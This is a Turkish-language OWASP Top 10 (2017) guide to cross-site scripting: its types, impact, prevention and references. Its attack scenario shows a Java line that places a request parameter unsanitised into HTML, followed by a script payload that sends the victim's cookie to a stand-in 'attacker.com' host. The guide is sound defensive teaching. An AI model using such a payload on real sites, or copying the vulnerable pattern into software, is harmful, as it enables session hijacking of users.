# A7:2017 Siteler Arası Betik Çalıştırma (XSS)

| Tehdit etkenleri/Saldırı vektörleri | Güvenlik zafiyeti           | Etkiler               |
| -- | -- | -- |
| Erişim Düzeyi : İstismar Edilebilirlik 3 | Yaygınlık 3 : Tespit Edilebilirlik 3 | Teknik 2 : İş |
| Otomatize araçlar XSS'in 3 türünü de tespit ve istismar edebilmektedir. Ayrıca ücretiz olarak erişilebilecek istismar araçları da bulunmaktadır. | XSS OWASP Top 10 içerisindeki en yaygın ikinci problemdir ve tüm uygulamaların yaklaşık üçte ikisinde görülmektedir. Otomatize araçlar, özellikle PHP, J2EE / JSP ve ASP.NET gibi olgun teknolojilerde otomatik olarak bazı XSS problemlerini bulabilmektedir. | Yansıtılmış ve DOM XSS için etki orta düzeyde ve depolanmış XSS için giriş bilgilerini, oturumları çalma veya kurbana zararlı yazılım bulaştırma gibi kurbanın tarayıcısında uzaktan kod çalıştırmada olduğu gibi ciddi düzeydedir. |

## Uygulamam Açıklık İçeriyor Mu?

Genellikle kullanıcıların tarayıcılarını hedef alan XSS'in üç farklı türü bulunmaktadır:

* **Yansıtılmış XSS**: Uygulama veya API, HTML çıktısının bir parçası olarak doğrulanmamış veya sterilize edilmemiş kullanıcı girdisi içermektedir. Başarılı bir saldırı saldırganın kurbanın tarayıcısında istediği HTML veya JavaScript kodunu çalıştırmasına izin vermektedir. Genellikle, kullanıcının zararlı Watering Hole web sayfaları, reklamlar veya benzerleri gibi saldırgan tarafından kontrol edilen bir sayfaya işaret eden kötücül bir bağlantı ile etkileşime geçmesi gerekmektedir.
* **Depolanmış XSS**: Uygulama veya API başka bir kullanıcı veya bir yönetici tarafından daha sonra görüntülenecek sterilize edilmemiş bir kullanıcı girdisini saklamaktadır. Depolanmış XSS genellikle yüksek veya kritik bir bulgu olarak değerlendirilmektedir.
* **DOM XSS**: Bir sayfa üzerinde saldırgan tarafından kontrol edilebilen veriyi dinamik olarak ekleyen JavaScript çerçeveleri, tek sayfa uygulamaları ve API'ler DOM XSS zafiyeti içermektedir. İdeal olarak, uygulama saldurgan tarafından kontrol edilen veriyi güvensiz JavaScript API'lerine yollamayacaktır.

Sıradan XSS saldırıları oturum çalma, hesap ele geçirme, MFA atlatma, DOM nod değiştirme veya bozma (trojan giriş panelleri gibi), zararlı yazılım indirme, klavye kaydetme ve diğer istemci taraflı saldırılar gibi kullanıcının tarayıcısına karşı yapılan saldırılardır.

## Nasıl Önlenir

XSS açıklığının önlenmesi güvenilmeyen verinin aktif tarayıcı içeriğinden ayırılmasını gerektirmektedir. Bu aşağıdakiler aracılığıyla yapılabilmektedir:

* Ruby on Rails, React JS gibi tasarımsal olarak XSS'i kendiliğinden sterilize eden çerçevelerin kullanımı. Her bir çerçevenin XSS koruma limitleri öğrenilmeli ve kapsam dışı olan kullanım örneklerinin üstesinden gelinmelidir.
* HTML çıktısında yer aldığı bağlama göre (body, attribute, JavaScript, CSS veya URL) güvenilmeyen HTTP isteği girdilerinin sterilize edilmesi Yansıtılmış ve Depolanmış XSS açıklıklarını çözecektir. ['XSS Korunması' OWASP Kopya Kağıdı](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) gerekli veri sterilizasyon teknikleri ile ilgili detayları içermektedir.
* İstemci tarafındaki tarayıcı dokümanı değiştirilirken bağlama duyarlı kodlamanın kullanılması DOM XSS açıklığına karşı koruma sağlamaktadır. Bu durum kaçınılmaz olduğunda, 'DOM tabanlı XSS Koruması' OWASP Kopya Kağıdı'nda belirtildiği gibi bağlama duyarlı strelizasyon teknikleri tarayıcı API'lerine uygulanabilir.
* XSS'e karşı derinlemesine savunma kontrolü olarak bir [İçerik Güvenlik Politikası (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)'nın kullanılması. Eğer iç dosya ekleme(örn. dizin aşımı veya izin verilen içerik teslim ağlarından zafiyet içeren kütüphaneler) aracılığıyla zararlı kodun eklenmesine yol açabilecek başka bir açıklık bulunmuyorsa, etkili olacaktır.

## Örnek Saldırı Senaryoları

**Senaryo #1**: Uygulama doğrulama veya sterilizasyon olmadan aşağıdaki HTML parçasının oluşturulmasında güvenilmeyen veriyi kullanmaktadır.

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
Saldırgan tarayıcısında 'CC' parametresini aşağıdaki gibi değiştirmektedir:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Bu saldırı kurbanın oturum ID değerinin saldırganın sitesine yollanmasına yol açmakta, bu durum da saldırganın kullanıcının mevcut oturumunu ele geçirmesine izin vermektedir.

**Not**: Saldırganlar uygulamada kullanılacak herhangi bir otomatize Siteler Arası İstek Sahteciliği (CSRF) korumasını atlatmak için XSS açıklığını kullanabilmektedir.

## Kaynaklar

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Dış Kaynaklar

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
